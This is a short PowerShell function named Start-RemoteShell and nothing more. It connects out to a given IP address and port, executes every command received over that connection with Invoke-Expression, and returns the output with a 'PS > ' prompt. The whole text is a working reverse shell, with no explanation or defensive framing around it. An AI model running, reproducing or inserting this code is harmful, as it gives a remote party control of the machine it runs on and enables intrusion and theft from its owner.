function Start-RemoteShell {
  param (
    [Parameter(mandatory=$true)]
    [string] $ip,
    [Parameter(mandatory=$true)]
    [int] $port
  )

  $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
  $s = $c.GetStream()
  [byte[]]$b=0..65535|%{0}
  while (($i=$s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $y = (iex $d 2>&1 | Out-String)
    $x = ([text.encoding]::ASCII).GetBytes($y + 'PS > ')
    $s.Write($x, 0, $x.Length)
    $s.Flush()
  }
  $c.Close()
}

